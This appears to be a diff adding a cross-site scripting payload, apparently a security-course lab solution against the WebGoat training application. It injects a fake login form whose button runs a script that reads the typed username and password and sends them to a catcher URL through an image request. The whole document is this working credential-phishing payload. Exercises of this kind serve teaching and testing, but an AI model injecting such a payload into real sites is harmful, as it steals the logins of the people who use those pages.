@@ -1,0 +1,17 @@
+</form>
+<script>
+    function hack() {
+        XSSImage = new Image;
+        XSSImage.src = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&phish-username=" +
+            document.phish.username.value +
+            "&phish-password=" +
+            document.phish.password.value;
+    } 
+</script>
+<form name="phish">
+    Username:<input type="text" name="username" id="ece568-2020f-user">
+    <br>
+    Password:<input type="password" name="password" id="ece568-2020f-pw">
+    <br>
+    <input type="submit" name="login" id="ece568-2020f-submit" value="login" onclick="hack()">
+</form>
